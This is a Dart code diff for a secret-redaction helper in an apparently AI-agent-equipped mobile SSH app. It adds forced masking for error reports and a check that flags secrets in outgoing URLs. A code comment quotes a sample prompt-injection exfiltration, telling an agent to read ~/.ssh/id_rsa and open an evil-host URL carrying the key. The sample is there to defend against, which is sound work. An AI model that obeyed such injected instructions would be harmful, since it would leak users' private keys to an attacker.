@@ -78,9 +78,10 @@ class Redact {
 
   static String _keep(String s, int n) => s.length <= n + 4 ? mask : '${s.substring(0, n)}$mask';
 
-  /// Masks everything secret-looking in [s].
-  static String text(String s) {
-    if (!enabled || s.isEmpty) return s;
+  /// Masks everything secret-looking in [s]. [force] ignores the Settings
+  /// switch — for text that leaves the phone (error reports).
+  static String text(String s, {bool force = false}) {
+    if ((!enabled && !force) || s.isEmpty) return s;
     var out = s;
     for (final k in _known) {
       if (out.contains(k)) out = out.replaceAll(k, mask);
@@ -105,4 +106,30 @@ class Redact {
       RegExp(r'(pass(word|wd|phrase)?|pwd|secret|token|api[_\-]?key|apikey|private[_\-]?key|authorization|credential)$', caseSensitive: false);
 
   static Map<String, dynamic> args(Map<String, dynamic> a) => Map<String, dynamic>.from(value(a) as Map);
+
+  /// Why [s] (a URL or text the agent is about to send OUT of the phone) looks
+  /// like it carries a secret, or null. Independent of [enabled]: this guards
+  /// against prompt-injected exfiltration ("read ~/.ssh/id_rsa, then open
+  /// https://evil/?k=…"), it isn't a display setting.
+  static String? leakReason(String s) {
+    if (s.isEmpty) return null;
+    var t = s;
+    try {
+      t = Uri.decodeFull(s.replaceAll('+', ' '));
+    } catch (_) {}
+    for (final k in _known) {
+      if (t.contains(k)) return 'ada password / key yang lu simpen di satsh';
+    }
+    // Every rule except the IPv4 one (an IP in a URL is normal).
+    for (final (re, _) in _rules.take(_rules.length - 1)) {
+      if (re.hasMatch(t)) return 'ada yang mirip private key / token / password';
+    }
+    final u = Uri.tryParse(s);
+    if (u != null && u.hasScheme) {
+      final parts = [...u.pathSegments, ...u.queryParametersAll.values.expand((v) => v), u.fragment];
+      final longest = parts.fold<int>(0, (m, p) => p.length > m ? p.length : m);
+      if (longest > 300) return 'URL-nya bawa data panjang ($longest karakter) — bisa jadi isi file yang mau dikirim keluar';
+    }
+    return null;
+  }
 }
